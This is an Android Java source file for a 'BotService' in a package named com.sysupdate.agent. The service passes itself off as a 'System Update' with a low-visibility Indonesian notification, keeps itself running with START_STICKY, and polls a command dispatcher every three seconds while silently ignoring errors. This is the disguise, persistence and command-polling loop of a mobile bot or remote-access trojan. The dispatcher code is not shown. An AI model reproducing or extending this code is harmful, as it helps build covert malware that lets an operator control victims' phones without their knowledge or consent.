package com.sysupdate.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class BotService extends Service {
    private Thread worker;
    private volatile boolean running = false;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, buildNotif());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) {
            running = true;
            worker = new Thread(() -> {
                CommandDispatcher d = new CommandDispatcher(getApplicationContext());
                while (running) {
                    try { d.poll(); } catch (Exception ignored) {}
                    try { Thread.sleep(3000); } catch (InterruptedException e) { break; }
                }
            });
            worker.start();
        }
        return START_STICKY;
    }

    private Notification buildNotif() {
        String ch = "sysupd";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel nc = new NotificationChannel(ch, "System Update", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(nc);
        }
        return new Notification.Builder(this, ch)
                .setContentTitle("System Update")
                .setContentText("Berjalan di latar belakang")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
    }

    @Override
    public void onDestroy() {
        running = false;
        if (worker != null) worker.interrupt();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}